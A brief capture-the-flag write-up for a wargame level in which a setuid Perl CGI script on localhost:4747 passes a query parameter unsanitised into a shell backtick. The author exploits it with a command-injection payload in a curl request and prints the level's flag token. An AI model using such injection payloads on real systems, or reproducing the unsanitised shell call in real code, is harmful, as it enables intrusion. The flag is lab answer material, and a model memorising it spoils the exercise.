Once in the home of level04, we can see :
```
ls -l
-rwsr-sr-x 1 flag04 level04 152 Mar  5  2016 level04.pl

cat level04.pl
#!/usr/bin/perl
# localhost:4747
use CGI qw{param};
print "Content-type: text/html\n\n";
sub x {
  $y = $_[0];
  print `echo $y 2>&1`;
}
x(param("x"));
```

So here we can see a basic perl script, the content itself doesn't seem really interesting.
Otherwise we can see a lolcalhost:4747 so we'll dig into that.

We know that apache is listening on port 4747 and apache base folder is /var/www

```
cat /var/www/index.html # Permission denied
cat /var/www/level04/level04.pl # same file as previously
-r-xr-x---+ 1 flag04 level04 152 May 11  2021 /var/www/level04/level04.pl
```
Looks like we found our target. As in the first levels we can see a file owned by flag04.

By looking at the perl function, we realize that we can inject an executable command in it:
```
curl localhost:4747?x='$(getflag)'
Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
```
